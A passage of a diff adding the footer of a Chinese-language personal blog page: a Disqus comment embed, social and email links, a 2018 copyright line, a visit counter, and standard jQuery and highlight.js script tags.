+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>要查看<a href="http://disqus.com/?ref_noscript"> Disqus </a>评论，请启用 JavaScript</noscript>
+    
+  
+
+</section>
+
+
+            <section class="footer">
+    <footer>
+        <div class = "footer_div">  
+        <nav class="cover-navigation navigation--social">
+          <ul class="navigation">
+
+          
+
+          
+          <!-- Github -->
+          <li class="navigation__item_social">
+            <a href="https://github.com/notwhy" title="@notwhy 的 Github" target="_blank">
+              <i class='social fa fa-github fa-2x'></i>
+              <span class="label">Github</span>
+            </a>
+          </li>
+          
+          
+          
+          <!-- Twitter -->
+          <li class="navigation__item_social">
+            <a href="http://twitter.com/whynotke" title="@whynotke" target="_blank">
+              <i class='social fa fa-twitter fa-2x'></i>
+              <span class="label">Twitter</span>
+            </a>
+          </li>
+          
+
+          
+
+          <!-- RSS -->
+          <li class="navigation__item_social">
+            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+              <i class='social fa fa-rss fa-2x'></i>
+              <span class="label">RSS</span>
+            </a>
+          </li>
+
+          
+          <!-- Email -->
+          <li class="navigation__item_social">
+            <a href="mailto:547103907@qq.com" title="Contact me">
+              <i class='social fa fa-envelope fa-2x'></i>
+              <span class="label">Email</span>
+            </a>
+          </li>
+          
+
+          </ul>
+        </nav>
+
+        </div>
+
+        <div class = "footer_div">  
+           <p class="copyright text-muted">
+            Copyright &copy; whynot 2018 Theme by <a href="http://baixin.io/">leopardpan</a> |
+            </p>
+        	<div align="right">
+    			<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+          <!-- 访问统计 -->
+          <span id="busuanzi_container_site_pv">
+            本站总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+          </span>
+
+        </div>
+        <div>
+    </footer>
+</section>
+
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript" src="/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+    
+  </body>
+
+</html>
